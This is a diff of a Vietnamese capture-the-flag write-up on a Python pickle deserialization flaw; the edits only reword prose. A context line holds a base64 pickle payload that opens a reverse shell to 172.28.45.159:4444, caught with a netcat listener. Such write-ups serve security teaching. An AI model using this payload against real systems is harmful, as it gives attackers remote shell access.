@@ -11,7 +11,7 @@ Trang log cho ta thông tin về ``username`` và ``token``, và để ý t
 
 ![this is image](./img/loginbytoken.png)
 
-Nhìn vào trang web admin có gợi ý ta về ``pickle`` và phần placeholder của input là mã base64 của một serialize pickle, ta suy đoán web này sẽ có ``Pickle-Deserialization vulnerability``
+Nhìn vào trang web admin có gợi ý ta về ``pickle`` và phần placeholder của input là mã base64 của một object được pickle, ta suy đoán web này sẽ có ``Pickle-Deserialization vulnerability``
 
 > Pickle là một module cho phép serialize và deserialize object trong Python. 
 
@@ -58,7 +58,7 @@ Output:
 ```bash
 b'gASVBgEAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlIwHcHl0aG9uM5SMAi1jlIzWaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE3Mi4yOC40NS4xNTkiLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL2Jhc2giKZSHlIWUUpQu'
 ```
-Ta dùng ``netcat`` listen trên port 4444 sau đó inject thử:
+Ta dùng ``netcat`` listen trên port 4444 và sau đó inject payload:
 
 ![this is image](./img/rs.png)
 
